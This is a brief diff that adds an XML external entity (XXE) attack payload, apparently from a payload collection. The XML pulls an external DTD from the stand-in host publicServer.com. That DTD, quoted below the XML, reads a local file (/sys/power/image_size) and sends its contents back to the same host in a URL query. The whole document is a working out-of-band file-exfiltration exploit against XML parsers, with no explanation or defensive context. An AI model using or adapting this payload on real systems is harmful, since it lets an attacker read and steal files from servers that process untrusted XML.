@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
+<data>&send;</data>
+
+  File stored on http://publicServer.com/parameterEntity_oob.dtd
+<!ENTITY % file SYSTEM "file:///sys/power/image_size">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
+  %all;
